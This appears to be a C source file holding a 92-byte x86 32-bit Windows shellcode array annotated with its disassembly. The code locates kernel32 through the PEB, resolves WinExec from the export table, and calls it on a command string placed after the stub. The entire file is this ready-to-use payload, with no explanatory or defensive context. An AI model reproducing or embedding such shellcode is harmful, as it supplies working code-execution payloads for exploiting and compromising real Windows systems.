
// Target architecture : X86 32

#define EXEC_SIZE 92

char EXEC[] = {
  /* 0000 */ "\x60"                         /* pushal                                   */
  /* 0001 */ "\x31\xc0"                     /* xor    eax, eax                          */
  /* 0003 */ "\x64\x8b\x40\x30"             /* mov    eax, dword ptr fs:[eax + 0x30]    */
  /* 0007 */ "\x8b\x40\x0c"                 /* mov    eax, dword ptr [eax + 0xc]        */
  /* 000A */ "\x8b\x78\x0c"                 /* mov    edi, dword ptr [eax + 0xc]        */
  /* 000D */ "\xeb\x02"                     /* jmp    0x11                              */
  /* 000F */ "\x8b\x3f"                     /* mov    edi, dword ptr [edi]              */
  /* 0011 */ "\x8b\x5f\x18"                 /* mov    ebx, dword ptr [edi + 0x18]       */
  /* 0014 */ "\x85\xdb"                     /* test   ebx, ebx                          */
  /* 0016 */ "\x74\x3d"                     /* je     0x55                              */
  /* 0018 */ "\x8b\x43\x3c"                 /* mov    eax, dword ptr [ebx + 0x3c]       */
  /* 001B */ "\x8b\x4c\x03\x78"             /* mov    ecx, dword ptr [ebx + eax + 0x78] */
  /* 001F */ "\xe3\xee"                     /* jecxz  0xf                               */
  /* 0021 */ "\x8d\x74\x0b\x18"             /* lea    esi, dword ptr [ebx + ecx + 0x18] */
  /* 0025 */ "\xad"                         /* lodsd  eax, dword ptr [esi]              */
  /* 0026 */ "\x91"                         /* xchg   eax, ecx                          */
  /* 0027 */ "\xe3\xe6"                     /* jecxz  0xf                               */
  /* 0029 */ "\xad"                         /* lodsd  eax, dword ptr [esi]              */
  /* 002A */ "\x92"                         /* xchg   eax, edx                          */
  /* 002B */ "\x01\xda"                     /* add    edx, ebx                          */
  /* 002D */ "\xad"                         /* lodsd  eax, dword ptr [esi]              */
  /* 002E */ "\x95"                         /* xchg   eax, ebp                          */
  /* 002F */ "\x01\xdd"                     /* add    ebp, ebx                          */
  /* 0031 */ "\xad"                         /* lodsd  eax, dword ptr [esi]              */
  /* 0032 */ "\x96"                         /* xchg   eax, esi                          */
  /* 0033 */ "\x01\xde"                     /* add    esi, ebx                          */
  /* 0035 */ "\x8b\x44\x8d\xfc"             /* mov    eax, dword ptr [ebp + ecx*4 - 4]  */
  /* 0039 */ "\x81\x3c\x18\x57\x69\x6e\x45" /* cmp    dword ptr [eax + ebx], 0x456e6957 */
  /* 0040 */ "\xe0\xf3"                     /* loopne 0x35                              */
  /* 0042 */ "\x75\xcb"                     /* jne    0xf                               */
  /* 0044 */ "\x0f\xb7\x04\x4e"             /* movzx  eax, word ptr [esi + ecx*2]       */
  /* 0048 */ "\x03\x1c\x82"                 /* add    ebx, dword ptr [edx + eax*4]      */
  /* 004B */ "\x6a\x01"                     /* push   1                                 */
  /* 004D */ "\xeb\x08"                     /* jmp    0x57                              */
  /* 004F */ "\xff\xd3"                     /* call   ebx                               */
  /* 0051 */ "\x89\x44\x24\x1c"             /* mov    dword ptr [esp + 0x1c], eax       */
  /* 0055 */ "\x61"                         /* popal                                    */
  /* 0056 */ "\xc3"                         /* ret                                      */
  /* 0057 */ "\xe8\xf3\xff\xff\xff"         /* call   0x4f                              */
};
